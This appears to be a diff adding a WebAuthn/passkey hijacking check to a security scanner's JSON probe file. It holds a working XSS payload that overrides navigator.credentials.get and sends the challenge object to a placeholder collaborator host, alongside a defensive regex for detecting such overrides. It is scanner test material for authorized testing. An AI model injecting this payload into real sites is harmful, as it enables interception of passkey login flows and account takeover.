@@ -1404,7 +1404,55 @@
           }
         }
       ]
+    },
+    "webauthn_api_hijack_jsinjection_2026": {
+      "description": "DEF CON 33 'Passkeys Pwned' (Allthenticate) — WebAuthn API hijacking via JavaScript injection. Attacker XSSes the target (or installs a malicious browser extension using Chrome's webAuthenticationProxy API) and overrides navigator.credentials.create / navigator.credentials.get to forge registration + login. Real-time prompt spoofing means cloud-synced passkeys (Apple/Google/Microsoft) are NOT 100% phishing-resistant. Detection is XSS-prerequisite — any XSS on a passkey-protected origin is a path to full WebAuthn bypass.",
+      "tech_match": [
+        "webauthn",
+        "passkey",
+        "fido2",
+        "navigator.credentials"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "<script>const _o=navigator.credentials.get.bind(navigator.credentials);navigator.credentials.get=async(o)=>{fetch('//COLLABORATOR/?ch='+btoa(JSON.stringify(o)));return _o(o);};</script>",
+          "description": "Override navigator.credentials.get to exfil the challenge object before the real flow proceeds. Confirms via Collaborator. Requires an XSS sink on the passkey-protected page.",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "interaction_types": [
+                "HTTP",
+                "DNS"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {
+            "manual_chain": true,
+            "requires_xss_sink": true,
+            "requires_collaborator": true
+          }
+        },
+        {
+          "payload": "<inspect rendered JS for navigator.credentials.create / .get overrides, references to chrome.webAuthenticationProxy, or extension content-script injection points>",
+          "description": "Passive defensive-check — grep client JS for signs the WebAuthn API has been redefined, extended, or proxied. Legitimate apps DO NOT override these. Reference-only; no payload sent.",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "navigator\\.credentials\\.(create|get)\\s*=|Object\\.defineProperty\\s*\\(\\s*navigator\\.credentials|chrome\\.webAuthenticationProxy"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {
+            "reference_only": true,
+            "manual_chain": true
+          }
+        }
+      ]
     }
   },
-  "description": ". v1.0 chain-attack contexts: mix-up, audience confusion, JWKS swap, redirect_uri parser quirks (per draft-ietf-oauth-security-topics). 2026 H2: passkey step-up bypass (CVE-2026-32879)."
+  "description": ". v1.0 chain-attack contexts: mix-up, audience confusion, JWKS swap, redirect_uri parser quirks (per draft-ietf-oauth-security-topics). 2026 H2: passkey step-up bypass (CVE-2026-32879) + WebAuthn API hijacking JS-injection (DEF CON 33)."
 }
